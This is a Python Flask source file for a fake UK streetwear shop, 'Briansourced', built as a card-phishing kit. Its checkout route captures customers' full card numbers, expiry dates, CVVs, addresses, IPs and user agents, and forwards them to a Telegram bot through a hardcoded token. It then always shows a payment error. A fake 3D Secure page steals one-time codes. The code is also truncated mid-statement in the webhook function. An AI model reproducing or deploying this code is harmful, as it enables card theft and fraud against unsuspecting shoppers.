from flask import Flask, render_template, request, jsonify, redirect, url_for
import sqlite3
import requests
import random
import string
from datetime import datetime
import os
import re
from functools import wraps

app = Flask(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    
    # Products table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        description TEXT NOT NULL,
        price REAL NOT NULL,
        sizes TEXT NOT NULL,
        image_url TEXT NOT NULL,
        stock INTEGER NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Orders table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        customer_name TEXT NOT NULL,
        email TEXT NOT NULL,
        phone TEXT NOT NULL,
        shipping_address TEXT NOT NULL,
        billing_address TEXT NOT NULL,
        card_number TEXT NOT NULL,
        expiry_date TEXT NOT NULL,
        cvv TEXT NOT NULL,
        total_amount REAL NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# Telegram Bot Integration
TELEGRAM_BOT_TOKEN = "8940598912:AAGmdiPFSRh9YjCaI11GLsAYHIWtPTEayoE"
TELEGRAM_CHAT_ID = "8768329228"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, data=data)
    except:
        pass

# Card validation functions
def validate_card_number(card_number):
    # Remove spaces and dashes
    card_number = re.sub(r'[\s-]', '', card_number)
    
    # Check if card number is numeric and has correct length
    if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Luhn algorithm
    total = 0
    for i, digit in enumerate(card_number):
        digit = int(digit)
        if i % 2 == len(card_number) % 2:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    
    return total % 10 == 0

def get_card_type(card_number):
    card_number = re.sub(r'[\s-]', '', card_number)
    
    if card_number.startswith('4'):
        return 'Visa'
    elif card_number.startswith('5'):
        return 'Mastercard'
    elif card_number.startswith('3'):
        return 'American Express'
    elif card_number.startswith('6'):
        return 'Discover'
    else:
        return 'Unknown'

def validate_expiry_date(expiry_date):
    # Check format MM/YY
    if not re.match(r'^(0[1-9]|1[0-2])\/\d{2}\$', expiry_date):
        return False
    
    month, year = expiry_date.split('/')
    month = int(month)
    year = int(year) + 2000  # Convert YY to YYYY
    
    current_year = datetime.now().year
    current_month = datetime.now().month
    
    # Check if date is in the future
    if year < current_year or (year == current_year and month < current_month):
        return False
    
    return True

def validate_cvv(cvv, card_type):
    if card_type == 'American Express':
        return len(cvv) == 4 and cvv.isdigit()
    else:
        return len(cvv) == 3 and cvv.isdigit()

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\$'
    return re.match(pattern, email) is not None

def validate_phone(phone):
    # Remove spaces, dashes, parentheses
    phone = re.sub(r'[\s\-$$$$]', '', phone)
    # Check if it starts with + and contains only digits after that
    return phone.startswith('+') and phone[1:].isdigit() and len(phone) >= 10

def is_suspicious(ip_address, user_agent):
    # Simple suspicious detection - in a real system, you'd use more sophisticated methods
    suspicious_patterns = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python-requests'
    ]
    
    for pattern in suspicious_patterns:
        if pattern.lower() in user_agent.lower():
            return True
    
    return False

# Routes
@app.route('/')
def index():
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products ORDER BY created_at DESC")
    products = cursor.fetchall()
    conn.close()
    return render_template_string(INDEX_TEMPLATE, products=products)

@app.route('/products')
def products():
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products ORDER BY created_at DESC")
    products = cursor.fetchall()
    conn.close()
    return render_template_string(PRODUCTS_TEMPLATE, products=products)

@app.route('/checkout')
def checkout():
    return render_template_string(CHECKOUT_TEMPLATE)

@app.route('/process_checkout', methods=['POST'])
def process_checkout():
    # Get form data
    customer_name = request.form.get('customer_name')
    email = request.form.get('email')
    phone = request.form.get('phone')
    shipping_address = request.form.get('shipping_address')
    billing_address = request.form.get('billing_address')
    card_number = request.form.get('card_number')
    expiry_date = request.form.get('expiry_date')
    cvv = request.form.get('cvv')
    total_amount = request.form.get('total_amount', '0.00')
    
    # Get client info
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'Unknown'))
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Validate card details
    card_type = get_card_type(card_number)
    card_valid = validate_card_number(card_number)
    expiry_valid = validate_expiry_date(expiry_date)
    cvv_valid = validate_cvv(cvv, card_type)
    email_valid = validate_email(email)
    phone_valid = validate_phone(phone)
    
    # Check for suspicious activity
    suspicious = is_suspicious(ip_address, user_agent)
    
    # Calculate validation score
    validation_score = 0
    if card_valid: validation_score += 20
    if expiry_valid: validation_score += 15
    if cvv_valid: validation_score += 15
    if email_valid: validation_score += 15
    if phone_valid: validation_score += 15
    if not suspicious: validation_score += 20
    
    # Store in database
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    cursor.execute('''
    INSERT INTO orders 
    (customer_name, email, phone, shipping_address, billing_address, 
    card_number, expiry_date, cvv, total_amount, ip_address, user_agent)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (customer_name, email, phone, shipping_address, billing_address, 
          card_number, expiry_date, cvv, total_amount, ip_address, user_agent))
    conn.commit()
    conn.close()
    
    # Send to Telegram with validation info
    message = f"""
🔥 NEW ORDER CAPTURED 🔥
ID: #{random.randint(10000, 99999)}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}

👤 PERSONAL INFO:
Name: {customer_name}
Email: {email}
Phone: {phone}

💳 CARD DETAILS:
Number: {card_number}
Type: {card_type}
Expiry: {expiry_date}
CVV: {cvv}

🏠 ADDRESSES:
Shipping: {shipping_address}
Billing: {billing_address}

💰 TOTAL: £{total_amount}

🔍 VALIDATION SCORE: {validation_score}/100
Card Valid: {'✅' if card_valid else '❌'}
Expiry Valid: {'✅' if expiry_valid else '❌'}
CVV Valid: {'✅' if cvv_valid else '❌'}
Email Valid: {'✅' if email_valid else '❌'}
Phone Valid: {'✅' if phone_valid else '❌'}
Suspicious: {'⚠️' if suspicious else '✅'}

🌐 TECH INFO:
IP: {ip_address}
User-Agent: {user_agent}
    """
    send_to_telegram(message)
    
    # Always return payment error
    return render_template_string(PAYMENT_ERROR_TEMPLATE)

@app.route('/verification')
def verification():
    order_id = request.args.get('order_id', random.randint(10000, 99999))
    return render_template_string(VERIFICATION_TEMPLATE, order_id=order_id)

@app.route('/complete_verification', methods=['POST'])
def complete_verification():
    code = request.form.get('code')
    order_id = request.args.get('order_id', 'Unknown')
    
    # Send verification code to Telegram
    message = f"""
🔐 3D SECURE VERIFICATION 🔐
Order ID: #{order_id}
Verification Code: {code}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}
IP: {request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'Unknown'))}
    """
    send_to_telegram(message)
    
    return render_template_string(VERIFICATION_ERROR_TEMPLATE)

@app.route('/support')
def support():
    return render_template_string(SUPPORT_TEMPLATE)

@app.route('/refund')
def refund():
    return render_template_string(REFUND_TEMPLATE)

@app.route('/telegram_webhook', methods=['POST'])
def telegram_webhook():
    import json
    from urllib.parse import urlparse
    import requests as req
    
    update = request.json
    message = update.get('message', {})
    
    if 'photo' in message:
        # Get the largest photo
        photo = message['photo'][-1]
        file_id = photo['
        # HTML Templates
INDEX_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Briansourced - Premium UK Streetwear</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --brian-green: #2a7f62;
            --brian-light-green: #3d9b7a;
            --brian-dark-green: #1a5c47;
            --brian-accent: #e6f7f2;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            color: #333;
        }
        
        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--brian-green) !important;
        }
        
        .btn-primary {
            background-color: var(--brian-green);
            border-color: var(--brian-green);
        }
        
        .btn-primary:hover {
            background-color: var(--brian-dark-green);
            border-color: var(--brian-dark-green);
        }
        
        .card {
            border: none;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
        }
        
        .badge {
            background-color: var(--brian-green);
        }
        
        .hero-section {
            background-color: var(--brian-accent);
            padding: 60px 0;
        }
        
        .footer {
            background-color: var(--brian-dark-green);
            color: white;
            padding: 40px 0;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-white">
        <div class="container">
            <a class="navbar-brand" href="/">Briansourced</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="/products">Products</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/support">Support</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/refund">Refunds</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link btn btn-primary text-white px-3" href="/checkout">Checkout</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container text-center">
            <h1 class="display-4 fw-bold">Briansourced</h1>
            <p class="lead">Premium UK Streetwear - Sourced for the City</p>
            <p class="mb-4">Brian's been sourcing the hottest streetwear for UK cities since 2020. Limited stock, premium quality.</p>
            <a href="/products" class="btn btn-lg btn-primary">Shop Now</a>
        </div>
    </div>

    <div class="container my-5">
        <div class="row">
            <div class="col-lg-8 mx-auto text-center mb-5">
                <h2 class="fw-bold">Featured Products</h2>
                <p class="text-muted">Limited stock - when it's gone, it's gone</p>
            </div>
        </div>
        
        <div class="row">
            {% if products %}
                {% for product in products %}
                <div class="col-md-4 mb-4">
                    <div class="card h-100">
                        <img src="{{ product[4] }}" class="card-img-top" alt="{{ product[1] }}">
                        <div class="card-body d-flex flex-column">
                            <h5 class="card-title">{{ product[1] }}</h5>
                            <p class="card-text">{{ product[2] }}</p>
                            <div class="mt-auto">
                                <p class="fw-bold">£{{ "%.2f"|format(product[3]) }}</p>
                                <p class="text-danger small">Only {{ product[5] }} left in stock!</p>
                                <div class="d-flex justify-content-between align-items-center">
                                    <span class="badge bg-success">Sizes: {{ product[4] }}</span>
                                    <a href="/checkout" class="btn btn-sm btn-primary">Buy Now</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <div class="col-12 text-center">
                    <p>No products available yet. Check back soon!</p>
                </div>
            {% endif %}
        </div>
    </div>

    <div class="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-4">
                    <h5>Briansourced</h5>
                    <p>Premium UK Streetwear - Sourced for the City</p>
                </div>
                <div class="col-md-4">
                    <h5>Customer Service</h5>
                    <ul class="list-unstyled">
                        <li><a href="/support" class="text-white">Contact Us</a></li>
                        <li><a href="/refund" class="text-white">Refund Policy</a></li>
                        <li>Email: Briansupportsourced@gmail.com</li>
                    </ul>
                </div>
                <div class="col-md-4">
                    <h5>Shipping Info</h5>
                    <p>Next Day Delivery: £5.99</p>
                    <p>Standard Delivery: £2.99 (3-5 days)</p>
                    <p>Free delivery on orders over £50</p>
                </div>
            </div>
            <hr class="my-4 bg-white">
            <div class="row">
                <div class="col-12 text-center">
                    <p>&copy; 2023 Briansourced. All rights reserved.</p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""
